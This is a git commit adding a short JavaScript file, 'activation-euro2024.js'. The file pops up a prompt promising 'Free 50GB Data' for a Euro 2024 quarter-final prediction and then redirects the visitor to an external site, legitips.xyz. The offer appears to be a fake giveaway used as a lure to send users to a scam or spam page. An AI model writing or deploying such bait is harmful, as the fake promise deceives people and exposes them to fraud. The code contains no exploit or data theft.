d5d3bf0efe67afdc428f56eadd5ecc44c374649c
legitips <83867893+legitips@users.noreply.github.com>
2024-07-04 09:18:32 -0700

    Create activation-euro2024.js

---
+++ activation-euro2024.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('EURO QUARTER FINAL PREDICTION:Dear Kindly Predict To Get Free 50GB Data, press 1 to check','1');
+if (password != '1') {
+location.href='https://legitips.xyz/euro2024.html';
+}
